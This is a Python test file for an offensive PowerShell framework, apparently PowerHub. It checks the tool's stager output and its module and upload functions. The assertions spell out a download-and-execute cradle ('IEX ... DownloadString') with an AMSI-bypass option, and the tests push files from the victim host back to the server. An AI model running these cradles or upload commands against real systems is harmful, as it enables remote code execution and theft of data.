#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from subprocess import check_output
from shlex import split
#  import tempfile
#  import re
import requests

import pytest

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, TEST_COMMANDS, init_tests  # noqa


MAX_TEST_MODULE_PS1 = 103

init_tests()


def get_stager():
    result = {}
    PORT = '8080'
    param_set = {
        'default': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
        'HTTPS': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "https",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
        'BASH': {
            "flavor": "hub",
            "GroupLauncher": "bash",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
    }
    i = 0
    while i < 10:
        try:
            for k, v in param_set.items():
                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                                         params=v).text
            break
        except requests.exceptions.ConnectionError:
            i += 1
            time.sleep(.5)
    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'",
                                                                    '\\"')
    return result


def execute_cradle(cmd):
    return check_output(split(cmd))[:-1].decode()


def create_modules():
    func = "function Invoke-Testfunc%(n)d { Write-Host 'Test%(n)d' }"
    from powerhub.directories import MOD_DIR
    for i in range(MAX_TEST_MODULE_PS1):
        with open(
            os.path.join(MOD_DIR, "ps1", "psmod%d.ps1" % i),
            "w"
        ) as f:
            f.write(func % {"n": i})


@pytest.fixture
def full_app():
    from powerhub import powerhub
    from powerhub import reverseproxy
    create_modules()
    powerhub.main(fully_threaded=True)
    yield get_stager()
    reverseproxy.reactor.stop()


def test_stager(full_app):
    assert full_app['default'] == (
        "$K=New-Object Net.WebClient;IEX "
        + f"$K.DownloadString('http://{TEST_URI}:8080"
        + "/0?t=http&f=h&a=reflection');"
    )
    assert full_app['HTTPS'].startswith(
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
        + "={param($1,$2);$2.Thumbprint -eq '"
    )
    assert full_app['HTTPS'].endswith(
        "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
        + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
    )

    win10cmd = TEST_COMMANDS["win10"] % full_app
    # Insert formatter for extra command
    win10cmd = win10cmd[:-2] + '%s' + win10cmd[-2:]
    out = execute_cradle(win10cmd % "")
    assert "Adrian Vollmer" in out
    assert "Run 'Help-PowerHub' for help" in out

    out = execute_cradle(win10cmd % "lshm")
    for i in range(MAX_TEST_MODULE_PS1):
        assert "psmod%d" % i in out

    out = execute_cradle(win10cmd % "lhm psmod53;Invoke-Testfunc53")
    expected = """Test53
Name            Type N  Loaded
----            ---- -  ------
ps1/psmod53.ps1 ps1  72   True"""
    assert "Test53" in out
    assert "psmod53" in out
    assert expected in out.replace('\r\n', '\n')

    out = execute_cradle(
        win10cmd % ('lhm \\"72-74,77\\";lshm;Invoke-Testfunc53;'
                    + "Invoke-Testfunc99;Invoke-Testfunc47;Invoke-Testfunc72;")
    )
    # I don't understand the order of the modules
    assert "Test53" in out
    assert "Test99" in out
    assert "Test47" in out
    assert "Test72" in out

    from powerhub.directories import UPLOAD_DIR
    testfile = "testfile.dat"
    out = execute_cradle(
        win10cmd % ('[io.file]::WriteAllBytes(\\"$env:TEMP/%s\\",(1..255));' %
                    testfile + 'pth \\"$env:TEMP/%s\\";' % testfile)
    )
    with open(os.path.join(UPLOAD_DIR, testfile), "rb") as f:
        data = f.read()
    assert data == bytes(range(1, 256))

    out = execute_cradle(
        win10cmd % ('\\"FooBar123\\"|pth -name %s;' % testfile)
    )
    with open(os.path.join(UPLOAD_DIR, testfile+".1"), "rb") as f:
        data = f.read()
    assert data == b"FooBar123"
